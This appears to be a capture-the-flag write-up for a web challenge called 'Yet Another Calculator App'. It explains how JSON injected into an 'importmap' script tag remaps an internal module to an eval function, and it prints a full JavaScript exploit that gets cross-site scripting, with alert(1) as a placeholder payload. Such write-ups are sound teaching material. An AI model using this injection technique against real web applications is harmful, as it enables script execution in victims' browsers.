# Primary Bug & Solution

## Setup

Yet Another Calculator App is a small web application that lets users describe a mathematical expresssion and render it into an automatic calculation page with an arbitrary number of inputs.

The initial expression can either be inputted via a custom DSL or through the AST representation of that same DSL. In either case, the server will template that input into a script tag with the content type set to a custom content type based off of the representation choice. This input is strictly checked to be a JSON object, and sanitized before being rendered.

The front-end code is a small collection of native-js ES6 modules that each do one step of the parsing and rendering process.

## Solution

This problem is a bit of a troll in that the custom DSL parsing is mor eor less irrelevant to the solution. It was introduced as a way to make the mime-type controll less contrived, and also because I like writing parsers. The intended solution is to do a pure-json injection into the script tag with the mime-type `importmap`. Although they're poorly documented, `importmap`s have been in chrome for the past several versions and are used with ES6 modules to descirbe howo named imports should be resolved.

For instance, if I wanted to import the library Moment, I could reference it in my code as `import { DateTime } from "moment"`, and then use an importmap to specify the CDN path of moment. The purpose of it is to clean up code using ESM, but because it hasn't been approved the documentation is limited.

However, we use this strange behavior to our advantage. Although CSP prevents us from accessing external sources, we can use it to remap internal aspects of the problem.

## Payload

Lets look at `calc.mjs`

```js
import astToJs from "/js/ast-to-js.mjs";
import evalCode from "/js/eval-code.mjs";
import lex from "/js/lex.mjs";
import parse from "/js/parse.mjs";

// Element declarations and unrelated setup
// ....

try {
    let ast;
    if (astProgram.type === "application/x-yaca-code") {
        const tokens = lex(program.code);
        ast = parse(tokens);
    } else {
        ast = JSON.parse(program.code);
    }

    const jsProgram = astToJs(ast);
    evalCode(jsProgram);
} catch(e) {
    // ...
}
```

If `astProgram.type === "importmap"`, then the program is going to parse `program.code` as a serialized AST, convert the AST to JS, and then evaluate it. Since the parser also keeps track of variables, the return type of `astToJs` is

```ts
interface ParsedProgram {
    code: string;
    variables: Set<string>;
}
```

Thus, we need a payload that both serves as an importmap and can be used to get code execution. Since `ast` if user-controlled and not overly sanitized, we can uses it to get code execution if `astToJs` is actually `evalCode`. Since they're both default imports, all that requires is remapping `/js/ast-to-js.mjs` to `/js/eval-code.mjs`!

Here was my full payload:

```js
const exploit = "alert(1)";

fetch("/upload", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
        type: "importmap",
        program: {
            name: "Pwned",
            code: JSON.stringify({
                code: exploit,
                variables: [],
            }),
            imports: {
                "/js/ast-to-js.mjs": "/js/eval-code.mjs"
            }
        }
    })
})
    .then((x) => x.text())
    .then((p) => window.open(`${window.location.href}${p.slice(1)}`, "_blank"))
```

Just weaponize `exploit` and you can abuse importmaps into XSS!

# Unintended solution

Much to my surprise, there was an unintended solution to this problem. Discovered by a few of the teams, it involves `String.prototype.replace` being incredibly cursed. For more details, check out [this writeup](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA).